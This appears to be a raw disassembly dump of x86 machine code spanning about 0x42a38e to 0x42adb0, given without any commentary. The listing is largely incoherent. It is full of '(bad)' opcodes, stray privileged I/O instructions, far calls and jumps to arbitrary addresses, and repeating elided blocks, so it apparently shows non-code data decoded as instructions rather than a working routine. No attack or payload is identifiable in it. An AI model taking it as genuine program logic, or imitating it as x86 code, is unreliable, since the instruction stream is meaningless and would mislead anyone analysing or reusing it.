  42a38e:	cwde   
  42a38f:	(bad)  
  42a390:	out    0x0,al
	...
  42a3f2:	add    BYTE PTR [eax],al
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x2614333d
  42a403:	pop    ds
  42a404:	add    ah,0x1
  42a407:	add    BYTE PTR ds:0xc2000001,al
  42a40d:	and    BYTE PTR [edi-0x74],dh
  42a410:	xchg   esi,eax
  42a411:	mov    ch,0xee
  42a413:	scas   eax,DWORD PTR es:[edi]
  42a414:	adc    DWORD PTR [ebx+0x446f2376],esi
  42a41a:	xor    BYTE PTR [edx],ah
  42a41c:	add    al,BYTE PTR [esi+esi*2]
  42a41f:	and    BYTE PTR [eax-0x3b],ch
  42a422:	add    eax,0x946b85d3
  42a427:	ret    
  42a428:	adc    al,0xe4
  42a42a:	xchg   ebx,eax
  42a42b:	mov    al,ds:0x789794fd
  42a430:	ret    
  42a431:	daa    
  42a432:	xor    cl,dl
  42a434:	shl    BYTE PTR [edx+eiz*1],cl
  42a437:	sub    edx,ecx
  42a439:	repz xor esp,DWORD PTR [edx-0x52]
  42a43d:	aam    0xca
  42a43f:	and    al,0xf0
  42a441:	sahf   
  42a442:	cmp    eax,0x9ab34879
  42a447:	mov    edi,0xfc9465
  42a44c:	retf   0x9ae6
  42a44f:	std    
  42a450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a451:	out    dx,eax
  42a452:	cmp    BYTE PTR [edx+0x19],bh
  42a455:	int    0x60
  42a457:	test   BYTE PTR [ebp+0x20],cl
  42a45a:	sub    ebx,0xc9333a5e
  42a460:	ret    0xa8ac
  42a463:	pop    ecx
  42a464:	xor    al,0xe8
  42a466:	enter  0x571e,0x9e
  42a46a:	scas   eax,DWORD PTR es:[edi]
  42a46b:	mov    esp,0x6277ec9d
  42a470:	mov    bh,0x64
  42a472:	xchg   edi,eax
  42a473:	xor    cl,BYTE PTR [edx-0x26007078]
  42a479:	cmp    eax,0x86b53be0
  42a47e:	add    eax,0xdc450f3c
  42a483:	and    DWORD PTR [edx+0x66],0xe21f268c
  42a48a:	mov    ds:0x7bf5973,al
  42a48f:	jmp    0xf49cb239
  42a494:	ret    0x790d
  42a497:	adc    DWORD PTR [ebx+0x22],esp
  42a49a:	inc    esi
  42a49b:	fldenv [edx+0x71]
  42a49e:	xchg   edx,eax
  42a49f:	lahf   
  42a4a0:	mov    al,0x7
  42a4a2:	icebp  
  42a4a3:	adc    esp,DWORD PTR [esi-0x10d486a9]
  42a4a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4aa:	inc    ecx
  42a4ab:	mov    dl,0x55
  42a4ad:	leave  
  42a4ae:	in     al,dx
  42a4af:	arpl   WORD PTR [edx-0x15],ax
  42a4b2:	ror    DWORD PTR [esi-0x2e],1
  42a4b5:	int    0xe
  42a4b7:	sbb    ecx,0xffffff90
  42a4ba:	push   ds
  42a4bb:	sub    al,0x41
  42a4bd:	mov    ch,0xf4
  42a4bf:	mov    ebx,0x4991f454
  42a4c4:	jle    0x42a497
  42a4c6:	ret    0xd0f9
  42a4c9:	aaa    
  42a4ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4cb:	xlat   BYTE PTR ds:[ebx]
  42a4cc:	adc    DWORD PTR [edi],0xffffffd9
  42a4cf:	mov    dl,0x92
  42a4d1:	lock xor eax,0xe16bda51
  42a4d7:	iret   
  42a4d8:	(bad)  
  42a4d9:	loopne 0x42a4d3
  42a4db:	xor    DWORD PTR [edi+0x5d],0xffffffe0
  42a4df:	out    dx,al
  42a4e0:	ja     0x42a51e
  42a4e2:	pop    ecx
  42a4e3:	adc    eax,0xb4175e87
  42a4e8:	lods   eax,DWORD PTR ds:[esi]
  42a4e9:	daa    
  42a4ea:	stc    
  42a4eb:	retf   0xe35f
  42a4ee:	sub    BYTE PTR [esi-0x7f],dh
  42a4f1:	sbb    esp,eax
  42a4f3:	retf   0x8dc4
  42a4f6:	sbb    al,0x14
  42a4f8:	imul   ebp
  42a4fa:	cmp    ah,BYTE PTR [edi+0x59]
  42a4fd:	(bad)  
  42a4fe:	fild   DWORD PTR [ebp-0x6c]
  42a501:	adc    eax,0x135671d6
  42a506:	cmp    eax,0xb9d8be1c
  42a50b:	sbb    eax,0xb03d041c
  42a510:	add    eax,DWORD PTR [eax]
	...
  42a572:	add    BYTE PTR [eax],al
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x3388e9f
  42a583:	sub    eax,DWORD PTR [edi+0x50001c5]
  42a589:	add    DWORD PTR [eax],eax
  42a58b:	add    BYTE PTR [edx-0x345dfaae],al
  42a591:	cdq    
  42a592:	sub    DWORD PTR [ebp+0x6f8b8fe7],esp
  42a598:	mov    dh,0x74
  42a59a:	retf   
  42a59b:	jbe    0x42a5e7
  42a59d:	xchg   esi,eax
  42a59e:	pop    esp
  42a59f:	gs retf 0xb1f
  42a5a3:	mov    al,0xb6
  42a5a5:	mov    dh,BYTE PTR [ebp+0x6f]
  42a5a8:	aaa    
  42a5a9:	(bad)  
  42a5aa:	mov    dl,0x6
  42a5ac:	out    dx,al
  42a5ad:	cmp    eax,0xa32e2910
  42a5b2:	stos   DWORD PTR es:[edi],eax
  42a5b3:	pop    ecx
  42a5b4:	dec    edi
  42a5b5:	and    al,0x46
  42a5b7:	ret    0xc452
  42a5ba:	lods   al,BYTE PTR ds:[esi]
  42a5bb:	and    bh,BYTE PTR [ebp-0x1df77761]
  42a5c1:	test   eax,0x61802cc7
  42a5c6:	retf   
  42a5c7:	jp     0x42a575
  42a5c9:	and    al,0x23
  42a5cb:	(bad)  
  42a5cc:	aad    0x49
  42a5ce:	(bad)  
  42a5cf:	in     al,0x60
  42a5d1:	adc    eax,DWORD PTR [edi-0x7a]
  42a5d4:	test   ax,0x6a3d
  42a5d8:	pop    edi
  42a5d9:	adc    dl,cl
  42a5db:	mov    al,0xdb
  42a5dd:	test   BYTE PTR [edx],cl
  42a5df:	lahf   
  42a5e0:	pandn  mm6,QWORD PTR [eax+0x12aed4e3]
  42a5e7:	dec    edx
  42a5e8:	sbb    eax,0xd44a86a3
  42a5ed:	mov    esp,0x871611dd
  42a5f2:	pop    esi
  42a5f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a5f4:	rcl    DWORD PTR [ecx-0x49a75b6],cl
  42a5fa:	xor    al,0xbe
  42a5fc:	push   edi
  42a5fd:	lods   al,BYTE PTR ds:[esi]
  42a5fe:	ror    DWORD PTR [edi+0x670f742a],1
  42a604:	pushf  
  42a605:	nop
  42a606:	stos   BYTE PTR es:[edi],al
  42a607:	and    ch,dh
  42a609:	inc    ecx
  42a60a:	inc    edi
  42a60b:	xchg   ecx,eax
  42a60c:	cli    
  42a60d:	adc    al,0xc3
  42a60f:	mov    edx,DWORD PTR [ebp-0x32eeb04d]
  42a615:	shl    DWORD PTR [edx+ecx*2-0x7d06e06],0xd7
  42a61d:	out    0xb1,eax
  42a61f:	shr    BYTE PTR [edi-0x42a593e5],0x6b
  42a626:	cwde   
  42a627:	xchg   ecx,eax
  42a628:	add    BYTE PTR [ebx-0x2cbd4042],dl
  42a62e:	int    0x64
  42a630:	and    esi,DWORD PTR [ebx+ebp*2+0x77]
  42a634:	push   ds
  42a635:	rol    DWORD PTR [edx-0x6be64ef4],0xc4
  42a63c:	mov    edx,0x4f58c9fb
  42a641:	cwde   
  42a642:	adc    BYTE PTR [ebp+0x7b6e35a8],cl
  42a648:	adc    BYTE PTR [edi+ecx*4+0x6e129a77],al
  42a64f:	int3   
  42a650:	xor    al,0x92
  42a652:	or     bl,BYTE PTR [ecx+0x185a8170]
  42a658:	in     al,0xe8
  42a65a:	push   0x39ab51ad
  42a65f:	push   edi
  42a660:	aad    0x6f
  42a662:	(bad)  
  42a663:	push   DWORD PTR [edi-0x5ad943fe]
  42a669:	xchg   edx,eax
  42a66a:	mov    WORD PTR [edi*1-0x24f767d3],?
  42a671:	imul   ebx,DWORD PTR [esi-0x4c58ba8a],0xcc729a01
  42a67b:	mov    bh,0x45
  42a67d:	xchg   ebp,eax
  42a67e:	(bad)  
  42a67f:	add    eax,0xda997abf
  42a684:	out    dx,eax
  42a685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a686:	mov    eax,0xcd17fa8c
  42a68b:	ror    DWORD PTR [ebp+0x16942185],1
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi+0x11b8131c],0x8ce5732a
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0x71000001
  42a70d:	in     al,0xc1
  42a70f:	and    cl,BYTE PTR [ebp-0x2306252e]
  42a715:	mov    ch,0xb3
  42a717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a718:	dec    edx
  42a719:	push   ecx
  42a71a:	cmp    ah,BYTE PTR [edx+0x181c28aa]
  42a720:	or     eax,0xdee23aa
  42a725:	neg    DWORD PTR [ecx-0x1f]
  42a728:	mov    esi,0x34f7a71c
  42a72d:	je     0x42a75c
  42a72f:	inc    edx
  42a730:	jae    0x42a78a
  42a732:	add    al,0x80
  42a734:	mov    ch,0x75
  42a736:	xor    esp,ebp
  42a738:	xor    ch,ah
  42a73a:	xchg   ebx,eax
  42a73b:	or     al,0xa0
  42a73d:	popf   
  42a73e:	out    0x9a,eax
  42a740:	(bad)  
  42a741:	push   edi
  42a742:	or     DWORD PTR [eax-0x20d0bc69],0x7d
  42a749:	fcmovnb st,st(1)
  42a74b:	xor    dh,BYTE PTR ds:0x71859e89
  42a751:	loop   0x42a723
  42a753:	addr16 jg 0x42a74f
  42a756:	inc    esp
  42a757:	mov    al,ds:0xb8b08aeb
  42a75c:	(bad)  
  42a75d:	out    0xe2,eax
  42a75f:	push   edi
  42a760:	jp     0x42a78f
  42a762:	jnp    0x42a72b
  42a764:	(bad)  
  42a766:	dec    edi
  42a767:	test   DWORD PTR [ecx],0x58272ee
  42a76d:	or     eax,0xc0e3a70e
  42a772:	(bad)  ds:0x27a8fe3c
  42a778:	bound  esi,QWORD PTR [edx-0x3f]
  42a77b:	cmp    esi,DWORD PTR [eax+0x710cb149]
  42a781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a782:	ins    BYTE PTR es:[edi],dx
  42a783:	jns    0x42a7d8
  42a785:	mov    edi,0x1d28ae38
  42a78a:	mov    bh,0x23
  42a78c:	inc    ecx
  42a78d:	mov    esp,0xa325ab10
  42a792:	inc    ebx
  42a793:	pop    ecx
  42a794:	out    0x40,al
  42a796:	xchg   ebp,eax
  42a797:	imul   BYTE PTR [ebp-0x3893880a]
  42a79d:	inc    ecx
  42a79e:	jb     0x42a737
  42a7a0:	jo     0x42a784
  42a7a2:	or     DWORD PTR [ebx-0x7ebf7bda],0x4
  42a7a9:	xor    ebx,DWORD PTR [ecx+0x7a]
  42a7ac:	cmp    eax,DWORD PTR [ebx]
  42a7ae:	xchg   ebp,eax
  42a7af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7b0:	and    eax,0x6264221f
  42a7b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7b6:	into   
  42a7b7:	dec    ebx
  42a7b8:	and    DWORD PTR [edi],ebp
  42a7ba:	adc    dl,dl
  42a7bc:	scas   al,BYTE PTR es:[edi]
  42a7bd:	mov    al,ds:0x8d807d44
  42a7c2:	(bad)  
  42a7c4:	jecxz  0x42a799
  42a7c6:	ins    BYTE PTR es:[edi],dx
  42a7c7:	(bad)  
  42a7c9:	stos   DWORD PTR es:[edi],eax
  42a7ca:	xchg   esp,eax
  42a7cb:	mov    ds:0x96fa8481,al
  42a7d0:	retf   0xe901
  42a7d3:	add    eax,0xb5315621
  42a7d8:	jae    0x42a7fd
  42a7da:	add    al,0x5d
  42a7dc:	inc    esi
  42a7dd:	mov    ebp,0x2de26437
  42a7e2:	jmp    0x42a7b9
  42a7e4:	nop
  42a7e5:	data16 jno 0x42a792
  42a7e8:	cmp    edx,DWORD PTR [edi+0x1055e39c]
  42a7ee:	pop    ebx
  42a7f0:	pop    ss
  42a7f1:	inc    ebx
  42a7f2:	jg     0x42a7ee
  42a7f4:	scas   eax,DWORD PTR es:[edi]
  42a7f5:	lds    ebx,FWORD PTR [edi]
  42a7f7:	jbe    0x42a860
  42a7f9:	dec    edi
  42a7fa:	jmp    0x42a780
  42a7fc:	or     al,0xd1
  42a7fe:	shr    DWORD PTR [edi+0x54],0x88
  42a802:	push   DWORD PTR [ebx]
  42a804:	adc    BYTE PTR [ecx+0x2d93054b],ah
  42a80a:	ds mov ah,0xe1
  42a80d:	aad    0xe1
  42a80f:	mov    al,ds:0x4a
	...
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x5ee86c97
  42a882:	mov    BYTE PTR [ecx],ah
  42a884:	xchg   ecx,eax
  42a885:	mov    DWORD PTR [ecx],0x10500
  42a88b:	add    BYTE PTR [esi],bh
  42a88d:	test   al,0x71
  42a88f:	repz or eax,0xf6db2e05
  42a895:	jns    0x42a8a3
  42a897:	repnz xchg esp,eax
  42a899:	vpsrlq xmm7,xmm4,XMMWORD PTR [ebp-0x24e9a4eb]
  42a8a1:	dec    esp
  42a8a2:	jbe    0x42a83f
  42a8a4:	lods   al,BYTE PTR ds:[esi]
  42a8a5:	add    ebx,DWORD PTR [ebp+0x11957aa0]
  42a8ab:	xchg   edx,eax
  42a8ac:	inc    ebp
  42a8ad:	xchg   DWORD PTR [edx],ebp
  42a8af:	fld    TBYTE PTR [edx]
  42a8b1:	pop    esi
  42a8b2:	xchg   ecx,eax
  42a8b3:	adc    esi,DWORD PTR [ecx+ecx*8]
  42a8b6:	stos   BYTE PTR es:[edi],al
  42a8b7:	ins    DWORD PTR es:[edi],dx
  42a8b8:	or     al,0x7d
  42a8ba:	push   es
  42a8bb:	rcl    DWORD PTR [ebx],cl
  42a8bd:	pop    ds
  42a8be:	in     al,dx
  42a8bf:	dec    esi
  42a8c0:	lods   eax,DWORD PTR ds:[esi]
  42a8c1:	aad    0x16
  42a8c3:	sbb    al,0xd1
  42a8c5:	adc    eax,DWORD PTR [edi]
  42a8c7:	xchg   ebp,eax
  42a8c8:	push   0x2bb1aa92
  42a8cd:	in     eax,dx
  42a8ce:	ret    0x4cee
  42a8d1:	fsub   DWORD PTR [esi-0x6cfc4973]
  42a8d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8d8:	in     eax,dx
  42a8d9:	pop    eax
  42a8da:	aam    0x54
  42a8dc:	mov    bh,0x14
  42a8de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a8df:	cld    
  42a8e0:	or     bh,BYTE PTR [edi+0x38]
  42a8e3:	jmp    0x42a927
  42a8e5:	jno    0x42a898
  42a8e7:	in     al,dx
  42a8e8:	(bad)  
  42a8e9:	jmp    0x42a95b
  42a8eb:	stos   BYTE PTR es:[edi],al
  42a8ec:	push   eax
  42a8ed:	jl     0x42a871
  42a8ef:	call   0x684979f3
  42a8f4:	adc    BYTE PTR [eax+edx*8-0x48],bh
  42a8f8:	and    eax,edx
  42a8fa:	push   edi
  42a8fb:	jle    0x42a8ad
  42a8fd:	mov    al,0x21
  42a8ff:	push   0x2799523f
  42a904:	jo     0x42a8ef
  42a906:	mov    ebp,DWORD PTR ds:0x1c2c1304
  42a90c:	mov    cs,WORD PTR [ebx+ebx*1]
  42a90f:	dec    edi
  42a910:	loop   0x42a961
  42a912:	or     eax,DWORD PTR cs:[eax+0x22]
  42a916:	pop    ss
  42a917:	loope  0x42a98c
  42a919:	int    0x7c
  42a91b:	adc    edx,DWORD PTR [esi-0x1fcc7fc7]
  42a921:	or     BYTE PTR ds:[ecx-0x59],dl
  42a925:	pop    edi
  42a926:	test   ebp,ecx
  42a928:	stos   DWORD PTR es:[edi],eax
  42a929:	into   
  42a92a:	std    
  42a92b:	adc    DWORD PTR [eax],edx
  42a92d:	sub    ebx,ecx
  42a92f:	push   ds
  42a930:	xchg   DWORD PTR [ebx+0x6e],esp
  42a933:	shl    BYTE PTR [esi],cl
  42a935:	jge    0x42a94f
  42a937:	cdq    
  42a938:	(bad)
  42a93b:	scas   al,BYTE PTR es:[edi]
  42a93c:	fs push cs
  42a93e:	mov    ebp,0x898d869f
  42a943:	test   al,0xe3
  42a945:	popf   
  42a946:	push   es
  42a947:	cmp    cl,BYTE PTR [ebx+ebp*4-0x3cbf5ad2]
  42a94e:	les    esi,FWORD PTR [ebx+0x35a04f77]
  42a954:	inc    ecx
  42a955:	mov    eax,0x5b7318a6
  42a95a:	shl    DWORD PTR [ecx-0x48],cl
  42a95d:	inc    esp
  42a95e:	loop   0x42a928
  42a960:	cld    
  42a961:	dec    ecx
  42a962:	lea    esp,[ebx]
  42a964:	pushf  
  42a965:	cld    
  42a966:	sub    esp,DWORD PTR ds:0xab356180
  42a96c:	gs xchg edi,eax
  42a96e:	push   esi
  42a96f:	jge    0x42a9e4
  42a971:	mov    eax,0x57a29f5d
  42a976:	inc    ecx
  42a977:	pop    edi
  42a978:	cld    
  42a979:	in     eax,0x4b
  42a97b:	and    eax,0xff8ace6e
  42a980:	mov    esi,0xf9b7b47e
  42a985:	mov    ch,0x60
  42a987:	test   DWORD PTR [edi+0x7b32ced2],esp
  42a98d:	push   ds
  42a98e:	test   DWORD PTR [esi+0x36],esi
	...
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	lods   eax,DWORD PTR ds:[esi]
  42aa01:	fld    QWORD PTR [esi+0x1c8962f]
  42aa07:	add    BYTE PTR ds:0xd1000001,al
  42aa0d:	mov    ch,0x2f
  42aa0f:	pop    ebx
  42aa11:	int    0x32
  42aa13:	sub    DWORD PTR [ecx+0x108e945],edi
  42aa19:	push   ds
  42aa1a:	cmp    BYTE PTR ds:0xed296a9a,al
  42aa20:	jp     0x42a9e1
  42aa22:	xor    dl,BYTE PTR [esi+0x2a8ea3f2]
  42aa28:	mov    esp,0xc95918d3
  42aa2d:	sbb    ebx,DWORD PTR [edx+0x4005dd0b]
  42aa33:	in     eax,dx
  42aa34:	retf   0x51e4
  42aa37:	outs   dx,BYTE PTR ds:[esi]
  42aa38:	rcl    BYTE PTR [ecx-0x24],0xbc
  42aa3c:	push   edx
  42aa3d:	iret   
  42aa3e:	mov    cl,0x8f
  42aa40:	pop    esi
  42aa41:	repz jae 0x42a9de
  42aa44:	pop    ecx
  42aa45:	call   0xce274415
  42aa4a:	inc    ebx
  42aa4b:	ror    dl,0x51
  42aa4e:	(bad)  
  42aa4f:	aaa    
  42aa50:	fistp  QWORD PTR [ebp+0x5042c141]
  42aa56:	push   edi
  42aa57:	adc    eax,ecx
  42aa59:	fiadd  DWORD PTR [edx-0x39]
  42aa5c:	or     DWORD PTR [ebp-0x45],ecx
  42aa5f:	push   esp
  42aa60:	mov    ah,0xce
  42aa62:	je     0x42aa15
  42aa64:	mov    ebx,0xd7a621a7
  42aa69:	push   esi
  42aa6a:	sbb    eax,0x5fff7b3c
  42aa6f:	ret    
  42aa70:	imul   eax,DWORD PTR [ebp+0x5409d55a],0xe4b6cb42
  42aa7a:	push   ebp
  42aa7b:	jbe    0x42aa48
  42aa7d:	in     al,0x28
  42aa7f:	nop
  42aa80:	repz sar DWORD PTR [eax+0x69],1
  42aa84:	jno    0x42aa6a
  42aa86:	and    BYTE PTR [esi-0x5bae283a],0x75
  42aa8d:	adc    cl,al
  42aa8f:	(bad)  
  42aa91:	sub    DWORD PTR [edi+0x32],0x1129f1d1
  42aa98:	jae    0x42aa4f
  42aa9a:	arpl   WORD PTR [ecx],di
  42aa9c:	inc    eax
  42aa9d:	cmp    eax,0x80771484
  42aaa2:	fdivp  st(0),st
  42aaa4:	test   BYTE PTR [ecx+0x2853624b],ah
  42aaaa:	enter  0xf488,0xcf
  42aaae:	push   cs
  42aaaf:	sub    cl,cl
  42aab1:	jns    0x42aa96
  42aab3:	cmp    al,0xb9
  42aab5:	scas   al,BYTE PTR es:[edi]
  42aab6:	pop    edi
  42aab7:	mov    ds:0x599de786,al
  42aabc:	dec    esp
  42aabd:	ret    
  42aabe:	sahf   
  42aabf:	mov    edx,0x7cfdda44
  42aac4:	stc    
  42aac5:	and    al,0x94
  42aac7:	push   0xffffff85
  42aac9:	mov    al,ds:0x3bb15005
  42aace:	jne    0x42aa74
  42aad0:	cld    
  42aad1:	(bad)  
  42aad3:	test   al,0x12
  42aad5:	xor    eax,0xef8be615
  42aada:	xchg   ecx,eax
  42aadb:	dec    edx
  42aadc:	dec    ebx
  42aadd:	dec    esi
  42aade:	les    esi,FWORD PTR [ebx+eax*4]
  42aae1:	fs cli 
  42aae3:	cmp    DWORD PTR [edx],0x4ea1b410
  42aae9:	ins    DWORD PTR es:[edi],dx
  42aaea:	imul   eax,DWORD PTR ds:0x73716181,0x24b31969
  42aaf4:	jge    0x42aa96
  42aaf6:	xchg   edx,eax
  42aaf7:	dec    esp
  42aaf8:	hlt    
  42aaf9:	dec    esi
  42aafa:	in     eax,0x10
  42aafc:	mov    al,BYTE PTR [ecx-0x1f33b909]
  42ab02:	aas    
  42ab03:	xlat   BYTE PTR ds:[ebx]
  42ab04:	call   0x4649:0xce1bc0a
  42ab0b:	sahf   
  42ab0c:	enter  0x4b4e,0xab
  42ab10:	jl     0x42ab12
	...
  42ab72:	add    BYTE PTR [eax],al
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	cli    
  42ab81:	pop    edi
  42ab82:	and    al,0x55
  42ab84:	fwait
  42ab85:	leave  
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    eax,0xa6000001
  42ab8d:	scas   eax,DWORD PTR es:[edi]
  42ab8e:	dec    esp
  42ab8f:	fisttp DWORD PTR [ecx+0x10]
  42ab92:	js     0x42ab3c
  42ab94:	adc    eax,0xd477092c
  42ab99:	fcmovne st,st(3)
  42ab9b:	mov    DWORD PTR [edi],ebx
  42ab9d:	sub    edx,DWORD PTR [esi]
  42ab9f:	xchg   esi,eax
  42aba0:	or     DWORD PTR [ebx+esi*2+0x40],esi
  42aba4:	mov    eax,0x5060527c
  42aba9:	sbb    BYTE PTR [eax],0x5
  42abac:	xor    esi,DWORD PTR [esi]
  42abae:	cmp    dl,BYTE PTR [esp+eiz*2-0x7d0767c6]
  42abb5:	cmc    
  42abb6:	inc    edi
  42abb7:	shr    DWORD PTR [ebx+0x3af75edc],1
  42abbd:	push   edx
  42abbe:	sbb    cl,dl
  42abc0:	loopne 0x42aba7
  42abc2:	add    DWORD PTR [edx-0xc5da3a8],ebp
  42abc8:	fwait
  42abc9:	pop    edx
  42abca:	adc    BYTE PTR [ebp+edx*2-0x3e],bh
  42abce:	xchg   ecx,eax
  42abcf:	lock push 0x136b6a8e
  42abd5:	sbb    al,0x6f
  42abd7:	stos   DWORD PTR es:[edi],eax
  42abd8:	dec    esp
  42abd9:	push   edx
  42abda:	outs   dx,DWORD PTR ds:[esi]
  42abdb:	ret    0x4356
  42abde:	jmp    0xa71470b9
  42abe3:	push   0xb78f9e57
  42abe8:	aaa    
  42abe9:	(bad)
  42abed:	add    al,bl
  42abef:	xchg   edx,eax
  42abf0:	std    
  42abf1:	xor    DWORD PTR [esi-0x2d2b6297],edi
  42abf7:	mov    edx,0xb21ee593
  42abfc:	in     eax,0xb5
  42abfe:	mov    ds:0x8b03ceef,al
  42ac03:	push   0xb2113fb5
  42ac08:	loope  0x42ab96
  42ac0a:	sbb    al,0x79
  42ac0c:	aas    
  42ac0d:	in     eax,0xfc
  42ac0f:	call   0x23d07ff9
  42ac14:	ror    DWORD PTR [edx-0x2],cl
  42ac17:	cmp    eax,0x5bf09fff
  42ac1c:	jns    0x42abc6
  42ac1e:	inc    ebp
  42ac1f:	clc    
  42ac20:	arpl   WORD PTR [edx+0x63],ax
  42ac23:	ins    BYTE PTR es:[edi],dx
  42ac24:	jp     0x42ac8f
  42ac26:	push   edi
  42ac27:	push   ebx
  42ac28:	mov    dl,0xca
  42ac2a:	cwde   
  42ac2b:	push   ebp
  42ac2c:	enter  0xf7e7,0xf6
  42ac30:	fdivr  QWORD PTR [eax]
  42ac32:	sbb    cl,BYTE PTR [edi+0x4e134166]
  42ac38:	(bad)  [ebx]
  42ac3a:	dec    esp
  42ac3b:	dec    ebp
  42ac3c:	push   edi
  42ac3d:	push   esp
  42ac3e:	mov    al,0x27
  42ac40:	xchg   BYTE PTR [edi-0x9e9106f],bh
  42ac46:	mov    dh,0x8f
  42ac48:	das    
  42ac49:	inc    edx
  42ac4a:	imul   esi,DWORD PTR [esi],0x4e27a88e
  42ac50:	pop    ebx
  42ac51:	jo     0x42abff
  42ac53:	sub    eax,0xc89dc5a3
  42ac58:	js     0x42abfc
  42ac5a:	fimul  DWORD PTR [edx-0x76]
  42ac5d:	inc    edx
  42ac5e:	cmp    eax,0x81acb72d
  42ac63:	(bad)  
  42ac64:	jle    0x42ac5b
  42ac66:	js     0x42ac0f
  42ac68:	or     al,0x12
  42ac6a:	mov    dh,0xca
  42ac6c:	ins    BYTE PTR es:[edi],dx
  42ac6d:	push   ecx
  42ac6e:	xchg   ecx,eax
  42ac6f:	fimul  DWORD PTR [edx]
  42ac71:	out    dx,al
  42ac72:	lea    esp,[edx+0x70]
  42ac75:	lahf   
  42ac76:	shl    DWORD PTR [edx],0xb6
  42ac79:	(bad)  
  42ac7a:	and    BYTE PTR [eax],ch
  42ac7c:	mul    DWORD PTR [eax]
  42ac7e:	enter  0x26af,0x82
  42ac82:	jno    0x42ac3b
  42ac84:	cmc    
  42ac85:	cmp    al,0x41
  42ac87:	lahf   
  42ac88:	je     0x42ac82
  42ac8a:	add    dl,BYTE PTR [edi]
  42ac8c:	shl    al,cl
  42ac8e:	xor    DWORD PTR [esi+0x3f],0x0
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	(bad)
  42ad04:	mov    al,ds:0x50001ca
  42ad09:	add    DWORD PTR [eax],eax
  42ad0b:	add    cl,dh
  42ad0d:	test   al,0x5f
  42ad0f:	retf   0xe02c
  42ad12:	inc    ecx
  42ad13:	pop    ss
  42ad14:	std    
  42ad15:	mov    DWORD PTR [ebp-0x6f],ecx
  42ad18:	jno    0x42ad48
  42ad1a:	(bad)  
  42ad1b:	stc    
  42ad1c:	adc    eax,DWORD PTR [eax-0x38f98c85]
  42ad22:	jb     0x42ad8e
  42ad24:	shl    BYTE PTR [esi+eiz*1],cl
  42ad27:	in     eax,dx
  42ad28:	mov    ecx,0x968f49a0
  42ad2d:	adc    BYTE PTR [ebp-0x1d],ah
  42ad30:	jo     0x42ad3c
  42ad32:	ss dec ebx
  42ad34:	add    al,0xf8
  42ad36:	dec    edx
  42ad37:	cmp    bh,BYTE PTR [edi]
  42ad39:	clc    
  42ad3a:	dec    edx
  42ad3b:	and    eax,0xbd0bea9a
  42ad40:	xchg   esi,eax
  42ad41:	aam    0xe9
  42ad43:	ins    DWORD PTR es:[edi],dx
  42ad44:	mov    eax,ds:0xd6df52f0
  42ad49:	add    bh,BYTE PTR [edx]
  42ad4b:	xor    eax,0x6ca2db12
  42ad50:	(bad)  
  42ad51:	in     eax,dx
  42ad52:	pop    ss
  42ad53:	shl    DWORD PTR ss:[ebx-0x4e6f266],0x2b
  42ad5b:	xchg   ebx,eax
  42ad5c:	push   ebx
  42ad5d:	test   al,0xa0
  42ad5f:	add    ch,cl
  42ad61:	sbb    eax,0x91c0ea2f
  42ad66:	sub    eax,0xf6de20d2
  42ad6b:	adc    eax,DWORD PTR [eax+eiz*8+0x762048c7]
  42ad72:	iret   
  42ad73:	mov    ch,0xae
  42ad75:	fiadd  WORD PTR [edi+0x4852c034]
  42ad7b:	ins    BYTE PTR es:[edi],dx
  42ad7c:	in     eax,0xcb
  42ad7e:	jnp    0x42adf8
  42ad80:	ret    
  42ad81:	mov    edx,0x8b1beec8
  42ad86:	push   ecx
  42ad87:	fidiv  DWORD PTR [eax+eax*2-0x23]
  42ad8b:	xchg   esp,eax
  42ad8c:	or     al,0xb0
  42ad8e:	ins    DWORD PTR es:[edi],dx
  42ad8f:	(bad)  
  42ad91:	mov    ds:0xa39324cc,al
  42ad96:	cmc    
  42ad97:	mov    bh,BYTE PTR [edx-0x7]
  42ad9a:	jae    0x42ad56
  42ad9c:	inc    edx
  42ad9d:	(bad)  
  42ad9e:	jp     0x42adfe
  42ada0:	shl    BYTE PTR ds:0x2cf502f3,1
  42ada6:	mov    ebx,0xb9519329
  42adab:	inc    esp
  42adac:	outs   dx,BYTE PTR ds:[esi]
  42adad:	pop    ss
  42adae:	jae    0x42adbf
  42adb0:	jmp    0x42ae15
